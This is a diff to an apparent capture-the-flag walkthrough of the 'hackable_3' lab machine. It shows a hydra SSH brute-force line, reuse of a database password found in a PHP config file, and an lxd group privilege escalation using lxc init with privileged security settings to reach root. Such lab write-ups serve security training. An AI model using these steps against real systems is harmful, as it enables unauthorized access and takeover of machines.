@@ -153,3 +153,64 @@ hydra -l jubiscleudo -P wordlist.txt ssh://192.168.100.7
 Lets Enumerate more and see for root privilege, but this user jubiscleudo does not have sudo privilege, so I checked in /home and got one more user hackable_3
 
 
+So after Enumearating `/var/www/html/` I got a php file and it has database connection with username and password:
+
+```php
+<?php
+/* Database credentials. Assuming you are running MySQL
+server with default setting (user 'root' with no password) */
+define('DB_SERVER', 'localhost');
+define('DB_USERNAME', 'hackable_3');
+define('DB_PASSWORD', 'TrOLLED_3');
+define('DB_NAME', 'hackable');
+ 
+/* Attempt to connect to MySQL database */
+$conexao = mysqli_connect(DB_SERVER, DB_USERNAME, DB_PASSWORD, DB_NAME);
+
+
+// Check connection
+if($conexao === false){
+    die("ERROR: Could not connect. " . mysqli_connect_error());
+} else {
+}
+?>
+
+```
+
+So lets try password: TrOLLED_3 for hackable_3
+
+### It worked !!!
+This user also does not have permission to /root directory, but when I execute the id command I got something ineresting.
+
+```bash
+hackable_3@ubuntu20:/$ id
+uid=1000(hackable_3) gid=1000(hackable_3) groups=1000(hackable_3),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
+```
+
+Here we can use lxd which is a container service to manage virtual machines on the system
+
+After lot's of searching on internet I got the following [lxd exploit guide](https://www.hackingarticles.in/lxd-privilege-escalation/) for lxd privilege escalation
+
+For lxd tar image I used git to clone the repo into the target machine
+`git clone  https://github.com/saghul/lxd-alpine-builder.git`
+
+![lxc image imported](screenshots/image_lxc.png)
+
+When I executed the command:
+```bash
+lxc init myimage ignite -c security.privileged=true
+```
+
+It gives error of lxd storage pool, so it can be solved using the commad:
+
+```bash
+lxd init
+```
+
+![root shell](screenshots/root.png)
+
+### Here I got the root shell
+
+![root flag](screenshots/root_flag.png)
+
+## Got all the Flags 🚩🚩
